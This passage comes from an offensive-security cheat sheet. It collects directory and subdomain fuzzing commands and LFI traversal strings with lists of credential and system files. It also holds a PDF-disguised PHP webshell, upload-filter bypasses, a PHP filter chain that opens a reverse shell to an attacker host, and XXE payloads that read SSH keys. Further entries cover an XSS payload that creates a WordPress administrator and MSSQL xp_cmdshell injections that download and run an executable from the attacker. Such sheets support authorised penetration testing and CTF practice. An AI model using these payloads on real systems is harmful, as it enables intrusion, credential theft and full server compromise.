118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
```

###### Execution

```c
curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59 debugger eval code:14:9
))</script>" --proxy 127.0.0.1:8080
```

#### ffuf

```c
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://<RHOST>/ -H "Host: FUZZ.<RHOST>" -fs 185
ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http://<RHOST>/backups/backup_2020070416FUZZ.zip
```

##### API Fuzzing

```c
ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
```

##### Searching for LFI

```c
ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
```

##### Fuzzing with PHP Session ID

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
```

##### Recursion

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
```

##### File Extensions

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
```

##### Rate Limiting

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
```

##### Virtual Host Discovery

```c
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
```

##### Massive File Extension Discovery

```c
ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
```

#### GitTools

```c
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
```

#### Gobuster

```c
-e    // extended mode that renders the full url
-k    // skip ssl certificate validation
-r    // follow cedirects
-s    // status codes
-b    // exclude status codes
-k            // ignore certificates
--wildcard    // set wildcard option

$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
$ gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://<RHOST>:<RPORT>/ -b 200 -k --wildcard
```

##### Common File Extensions

```c
txt,bak,php,html,js,asp,aspx
```

##### Common Picture Extensions

```c
png,jpg,jpeg,gif,bmp
```

##### POST Requests

```c
gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
```

##### DNS Recon

```c
gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

##### VHost Discovery

```c
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

##### Specifiy User Agent

```c
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
```

#### Local File Inclusion (LFI)

```c
http://<RHOST>/<FILE>.php?file=
http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```
##### Until php 5.3

```c
http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

##### Null Byte

```c
%00
0x00
```

##### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

##### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```c
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```c
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
base64 -d <FILE>.php
```

##### Django, Rails, or Node.js Web Application Header Values

```c
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

##### Linux Files

```c
/app/etc/local.xml
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

##### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

#### PDF PHP Inclusion

Create a file with a PDF header, which contains PHP code.

```c
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

```c
http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

#### PHP Upload Filter Bypasses

```c
.sh
.cgi
.inc
.txt
.pht
.phtml
.phP
.Php
.php3
.php4
.php5
.php7
.pht
.phps
.phar
.phpt
.pgif
.phtml
.phtm
.php%00.jpeg
```

```c
<FILE>.php%20
<FILE>.php%0d%0a.jpg
<FILE>.php%0a
<FILE>.php.jpg
<FILE>.php%00.gif
<FILE>.php\x00.gif
<FILE>.php%00.png
<FILE>.php\x00.png
<FILE>.php%00.jpg
<FILE>.php\x00.jpg
mv <FILE>.jpg <FILE>.php\x00.jpg
```

#### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```

```c
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

```c
python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

#### PHP Generic Gadget Chains (PHPGGC)

```c
phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
```

#### Server-Side Request Forgery (SSRF)

```c
https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
```

#### Server-Side Template Injection (SSTI)

##### Fuzz String

> https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti

```c
${{<%[%'"}}%\.
```

##### Magic Payload

> https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee

```c
{{ ‘’.__class__.__mro__[1].__subclasses__() }}
```

#### Upload Vulnerabilities

```c
ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
SVG: Stored XSS / Server-Side Request Forgery
GIF: Stored XSS
CSV: CSV Injection
XML: XXE
AVI: Local File Inclusion / Server-Side request Forgery
HTML/JS: HTML Injection / XSS / Open Redirect
PNG / JPEG: Pixel Flood Attack
ZIP: Remote Code Exection via Local File Inclusion
PDF / PPTX: Server-Side Request Forgery / Blind XXE
```

#### wfuzz

```c
wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
```

##### Write to File

```c
wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
```

##### Custom Scan with limited Output

```c
wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
```

##### Fuzzing two Parameters at once

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
```

##### Domain

```c
wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
```

##### Subdomain

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
```

##### Git

```c
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
```
##### Login

```c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST> --hc 200 -c
wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST> --ss "Invalid login"
```

##### SQL

```c
wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
```

##### DNS

```c
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
```

##### Numbering Files

```c
wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
```

##### Enumerating PIDs

```c
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```

#### WPScan

```c
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
```

#### XML External Entity (XXE)

##### Skeleton Payload Request

```c
GET / HTTP/1.1
Host: <RHOST>:<RPORT>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 136

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://<LHOST>:80/shell.php" >]>
<foo>&xxe;</foo>
```

##### Payloads

```c
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
 <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
```

```c
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
```

```c
username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
```

### Database Analysis

#### impacket-mssqlclient

##### Common Commands

```c
enum_logins
enum_impersonate
```

##### Connection

```c
impacket-mssqlclient <USERNAME>@<RHOST>
impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
impacket-mssqlclient -k -no-pass <RHOST>
impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
```

```c
export KRB5CCNAME=<USERNAME>.ccache
impacket-mssqlclient -k <RHOST>.<DOMAIN>
```

#### MongoDB

```c
mongo "mongodb://localhost:27017"
```

```c
> use <DATABASE>;
> show tables;
> show collections;
> db.system.keys.find();
> db.users.find();
> db.getUsers();
> db.getUsers({showCredentials: true});
> db.accounts.find();
> db.accounts.find().pretty();
> use admin;
```

##### User Password Reset to "12345"

```c
> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
```

#### MSSQL

##### Connection

```c
sqlcmd -S <RHOST> -U <USERNAME> -P '<PASSWORD>'
impacket-mssqlclient <USERNAME>:<PASSWORD>@<RHOST> -windows-auth
```

##### Common Commands

```c
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM <DATABASE>.information_schema.tables;
SELECT * FROM <DATABASE>.dbo.users;
```

##### Show Database Content

```c
1> SELECT name FROM master.sys.databases
2> go
```

##### OPENQUERY

```c
1> select * from openquery("web\clients", 'select name from master.sys.databases');
2> go
```

```c
1> select * from openquery("web\clients", 'select name from clients.sys.objects');
2> go
```

##### Binary Extraction as Base64

```c
1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
2> go > export.txt
```

##### Steal NetNTLM Hash / Relay Attack

```c
SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
```

##### Linked SQL Server Enumeration

```c
SQL> SELECT user_name();
SQL> SELECT name,sysadmin FROM syslogins;
SQL> SELECT srvname,isremote FROM sysservers;
SQL> EXEC ('SELECT current_user') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('SELECT srvname,isremote FROM sysservers') at [<DOMAIN>\<CONFIG_FILE>];
SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DOMAIN>\<CONFIG_FILE>];
```

##### xp_cmdshell

```c
SQL> EXECUTE AS LOGIN = 'sa';
SQL> EXEC sp_configure 'Show Advanced Options', 1; 
SQL> RECONFIGURE; 
SQL> EXEC sp_configure 'xp_cmdshell', 1; 
SQL> RECONFIGURE;
SQL> EXEC xp_cmdshell 'dir';
```

```c
SQL> EXEC sp_configure 'Show Advanced Options', 1;
SQL> reconfigure;
SQL> sp_configure;
SQL> EXEC sp_configure 'xp_cmdshell', 1;
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```

```c
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
```

```c
';EXEC master.dbo.xp_cmdshell 'ping <LHOST>';--
';EXEC master.dbo.xp_cmdshell 'certutil -urlcache -split -f http://<LHOST>/shell.exe C:\\Windows\temp\<FILE>.exe';--
';EXEC master.dbo.xp_cmdshell 'cmd /c C:\\Windows\\temp\\<FILE>.exe';--
```

#### MySQL

```c
mysql -u root -p
mysql -u <USERNAME> -h <RHOST> -p
```

```c
mysql> STATUS;
mysql> SHOW databases;
mysql> USE <DATABASE>;
mysql> SHOW tables;
mysql> DESCRIBE <TABLE>;
mysql> SELECT version();
mysql> SELECT system_user();
